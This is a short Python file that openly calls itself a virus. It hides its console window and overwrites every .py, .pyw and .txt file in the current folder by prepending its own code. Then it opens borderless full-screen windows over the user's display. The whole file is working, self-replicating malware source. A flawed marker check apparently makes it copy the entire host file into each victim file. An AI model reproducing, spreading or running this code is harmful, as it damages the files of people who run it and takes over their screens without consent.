# VIRUS SAYS HI!
import tkinter as tk
import sys
import glob
import ctypes

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

def get_current_window():

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW
    hwnd = GetForegroundWindow()
    length = GetWindowTextLength(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    GetWindowText(hwnd, buff, length + 1)
    return buff.value

virus_code = []

with open(sys.argv[0], 'r',encoding="latin1") as f:
    lines = f.readlines()


self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt')

for file in python_files:
    with open(file, 'r',encoding="latin1") as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w',encoding="latin1") as f:
            f.writelines(final_code)



def malicious_code():
    HEIGHT = user32.GetSystemMetrics(1);
    WIDTH = user32.GetSystemMetrics(0);
    for i in range(0, 2):
        root = tk.Tk()
        root.overrideredirect(1)
        canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
        canvas.pack()

    root.mainloop()


malicious_code()

# VIRUS SAYS BYE!



